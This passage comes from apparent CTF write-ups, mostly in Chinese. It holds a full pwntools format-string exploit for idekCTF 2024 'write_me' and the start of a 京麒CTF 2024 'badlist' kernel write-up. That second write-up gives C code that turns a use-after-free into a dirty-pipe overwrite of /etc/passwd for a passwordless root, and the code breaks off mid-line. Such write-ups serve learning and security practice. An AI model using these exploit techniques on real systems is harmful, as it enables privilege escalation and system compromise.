class="hljs-built_in">len</span>(payload)))<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Format string? &#x27;</span>,payload.encode())<br>p.recvuntil(<span class="hljs-string">b&#x27;Eurus&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h1><ul><li><p>既然可以用溢出解决cnt跳过的问题就不需要用unsorted bin和large bin风水了，直接用tcache就行</p></li><li><p>用tcache造一条chain</p><ul><li>%hhn盖low byte写偏移</li><li>%hhn写地址</li></ul><img src="/2024/08/20/idekctf2024-writeme/chain.png" class title="chain"></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,sz</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size? &#x27;</span>,<span class="hljs-built_in">str</span>(sz).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><br><span class="hljs-comment">#p=process(&#x27;./write_me&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><br><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-number">0xd60</span>-<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_heap_address</span>(<span class="hljs-params">lens</span>):<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lens):<br>        add(idx+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>        delete(idx+<span class="hljs-number">1</span>)<br>        delete(idx)<br>        add(idx,<span class="hljs-number">0x10</span>)<br>        add(idx+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br><br>prepare_heap_address(<span class="hljs-number">0x100</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,idx</span>):<br>        self.addr=[addr&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>]<br>        self.idx=idx<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> [Dword(self.addr[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,self.idx),Dword(self.addr[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>,self.idx),Dword(self.addr[<span class="hljs-number">2</span>],<span class="hljs-number">4</span>,self.idx)]<br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Value</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,val,idx</span>):<br>        self.val=[val&amp;<span class="hljs-number">0xffff</span>,(val&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>]<br>        self.idx=idx<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> [Dword(self.val[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,self.idx),Dword(self.val[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>,self.idx)]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Challenge</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,val,idx</span>):<br>        self.addr=[Address(addr,idx),Address(addr+<span class="hljs-number">2</span>,idx)]<br>        self.val=Value(val,idx)<br>        self.idx=idx<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dword</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,val,offset,idx</span>):<br>        self.val=val<br>        self.idx=idx<br>        self.offset=offset<br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>challenges=[]<br>val_dwords_group=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;: Write 0x&#x27;</span>)<br>    val=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;to address 0x&#x27;</span>)<br>    addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    challenge=Challenge(addr,val,i)<br>    challenges.append(challenge)<br>    val_dwords_group+=challenge.val.divide()<br><br>payload=<span class="hljs-string">&#x27;&#x27;</span><br>payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">3</span><br>cnt=<span class="hljs-number">3</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_by</span>(<span class="hljs-params">val</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xff</span>)&gt;=val:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val+<span class="hljs-number">0x100</span>-(cnt&amp;<span class="hljs-number">0xff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+<span class="hljs-number">0x100</span>+(cnt&amp;<span class="hljs-number">0xffffffffffffff00</span>)<br>    <span class="hljs-keyword">else</span>:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val-(cnt&amp;<span class="hljs-number">0xff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+(cnt&amp;<span class="hljs-number">0xffffffffffffff00</span>)<br>    pl+=<span class="hljs-string">&#x27;%hhn&#x27;</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_dword</span>(<span class="hljs-params">val</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xffff</span>)&gt;=val:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val+<span class="hljs-number">0x10000</span>-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+<span class="hljs-number">0x10000</span>+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    <span class="hljs-keyword">else</span>:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    pl+=<span class="hljs-string">&#x27;%hn&#x27;</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_dword_with_off</span>(<span class="hljs-params">val,off</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xffff</span>)&gt;=val:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val+<span class="hljs-number">0x10000</span>-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+<span class="hljs-number">0x10000</span>+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    <span class="hljs-keyword">else</span>:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(off)+<span class="hljs-string">&#x27;$hn&#x27;</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_addr</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    addr_dwords=<span class="hljs-built_in">sorted</span>(addr.divide(),key=<span class="hljs-keyword">lambda</span> item: item.val)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> addr_dwords:<br>        pl+=write_by(item.offset)<br>        pl+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">2</span><br>        cnt+=<span class="hljs-number">2</span><br>        pl+=write_dword(item.val)<br>        pl+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">2</span><br>        cnt+=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">for</span> chal <span class="hljs-keyword">in</span> challenges:<br>   payload+=write_addr(chal.addr[<span class="hljs-number">0</span>])<br>   payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">8</span><br>   cnt+=<span class="hljs-number">8</span><br>   payload+=write_addr(chal.addr[<span class="hljs-number">1</span>])<br>   payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">8</span><br>   cnt+=<span class="hljs-number">8</span><br><br>log.info(<span class="hljs-string">&#x27;Write addresses finished&#x27;</span>)<br><br>addr_base_off=<span class="hljs-number">1</span><br>addr_chunk=<span class="hljs-number">0x20</span><br>val_dwords_group=val_dwords_group<br><span class="hljs-keyword">for</span> dword <span class="hljs-keyword">in</span> val_dwords_group:<br>    payload+=write_dword_with_off(dword.val,addr_base_off+addr_chunk*(dword.idx*<span class="hljs-number">2</span>+dword.offset//<span class="hljs-number">2</span>))<br><br>log.info(<span class="hljs-string">&#x27;Write values finished&#x27;</span>)<br><br>payload+=<span class="hljs-string">&#x27;Eurus&#x27;</span><br>log.info(<span class="hljs-string">&#x27;len(payload) = &#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Format string? &#x27;</span>,payload.encode())<br>p.recvuntil(<span class="hljs-string">b&#x27;Eurus&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/2024/08/20/idekctf2024-writeme/flag.png" class title="flag">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 京麒CTF badlist wp</title>
    <link href="/2024/08/16/jqctf2024-badlist/"/>
    <url>/2024/08/16/jqctf2024-badlist/</url>
    
    <content type="html"><![CDATA[<p>好久没kernel了，摸一道</p><span id="more"></span><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><ul><li><p>数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_args</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     idx_src;<br>    <span class="hljs-type">uint8_t</span>     idx_dst;<br>    <span class="hljs-type">uint16_t</span>    id;<br>    <span class="hljs-type">char</span>*      content;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_list</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span>*<span class="hljs-title">next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span>*<span class="hljs-title">prev</span>;</span><br>    <span class="hljs-type">uint8_t</span>   idx;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span>*<span class="hljs-title">next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span>*<span class="hljs-title">prev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_info</span>*<span class="hljs-title">info</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_info</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span>id;<br>    <span class="hljs-type">uint16_t</span>count;<br>    <span class="hljs-type">char</span>*content[<span class="hljs-number">0x1fc</span>];<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>功能：</p><ul><li>0x1337：create chunk</li><li>0x1338：delete chunk</li><li>0x1339：link chunk</li><li>0x133a：create list</li><li>0x133b：delete list</li><li>0x133c：show chunk</li></ul></li><li><p>漏洞点：count可以循环，kfree info后不会把info指针置空，可以uaf</p></li></ul><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>badlist_info的大小是0x400，用pipe_buffer，<em>也就会这个了</em></p><ul><li>free的page会放进tmp_page循环使用<ul><li>先write一页再全部read，free的page变成tmp_page</li><li>再write下一个pipe_buffer就会使用tmp_page，利用第二个pipe_buffer获得page和ops指针</li><li>主要是为了解决badlist_info前四字节的id和count未知的问题</li></ul></li><li>dirty pipe<ul><li>改&#x2F;etc&#x2F;passwd，把root设置为无密码</li></ul></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>自己搓的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEV_PATH                <span class="hljs-string">&quot;/dev/badlist&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREATE_CHUNK_MAGIC      0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE_CHUNK_MAGIC      0x1338</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LINK_CHUNK_MAGIC        0x1339</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREATE_LIST_MAGIC       0x133a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE_LIST_MAGIC       0x133b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USE_CHUNK_MAGIC         0x133c</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TARGET_FILE             <span class="hljs-string">&quot;/etc/passwd&quot;</span></span><br><br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x2000</span>];<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_args</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     idx_src;<br>    <span class="hljs-type">uint8_t</span>     idx_dst;<br>    <span class="hljs-type">uint16_t</span>    id;<br>    <span class="hljs-type">char</span> *      content; <br>&#125; Badlist_Args;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_chunk</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx, <span class="hljs-type">uint16_t</span> id, <span class="hljs-type">char</span> * content)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>        .id         = id &lt;&lt; <span class="hljs-number">8</span>,<br>        .content    = content,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, CREATE_CHUNK_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">delete_chunk</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx, <span class="hljs-type">uint16_t</span> id)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>        .id         = id &lt;&lt; <span class="hljs-number">8</span>,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, DELETE_CHUNK_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">link_chunk</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx_src, <span class="hljs-type">uint8_t</span> idx_dst, <span class="hljs-type">uint16_t</span> id)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx_src,<br>        .idx_dst    = idx_dst,<br>        .id         = id &lt;&lt; <span class="hljs-number">8</span>,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, LINK_CHUNK_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_list</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, CREATE_LIST_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">delete_list</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, DELETE_LIST_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">use_chunk</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx, <span class="hljs-type">uint16_t</span> id, <span class="hljs-type">char</span> * content)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>        .id         = id &lt;&lt; <span class="hljs-number">8</span>,<br>        .content    = content,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, USE_CHUNK_MAGIC, &amp;args);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    save_status();<br><br>    dev_fd = open(DEV_PATH, O_RDWR);<br>    <span class="hljs-keyword">if</span>(dev_fd &lt; <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;Open Device&quot;</span>);<br>    &#125;<br><br>    create_list(<span class="hljs-number">0</span>);<br>    create_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;testtest&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0xffff</span>; i++) &#123;<br>        use_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, buffer);<br>    &#125;<br>    use_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, buffer);<br><br>    <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>    pipe(pipe_fd);<br>    write(pipe_fd[<span class="hljs-number">1</span>], buffer, <span class="hljs-number">0x1000</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], buffer, <span class="hljs-number">0x1000</span>);<br>    write(pipe_fd[<span class="hljs-number">1</span>], buffer, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-type">int</span> target_fd = open(TARGET_FILE, O_RDONLY);<br>    <span class="hljs-type">loff_t</span> offset = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(target_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;Open Target File&quot;</span>);<br>    &#125;<br>    splice(target_fd, &amp;offset, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">uint16_t</span> pipe_id = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">uint16_t</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-type">uint16_t</span>)<span class="hljs-number">0xffff</span>; i++) &#123;<br>        <span class="hljs-type">int</span> ret = use_chunk(<span class="hljs-number">0</span>, i, &amp;buffer[<span class="hljs-number">4</span>]);<br>        pipe_id = i;<br>        <span class="hljs-keyword">if</span>(!ret) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    *(<span class="hljs-type">uint16_t</span> *)buffer = pipe_id;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">fake_buffer</span> =</span> (<span class="hljs-keyword">struct</span> pipe_buffer *)&amp;buffer[<span class="hljs-number">0x28</span> * <span class="hljs-number">2</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] pipe_buffer-&gt;page = \033[0m%llx\n&quot;</span>, fake_buffer-&gt;page);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] pipe_buffer-&gt;ops = \033[0m%llx\n&quot;</span>, 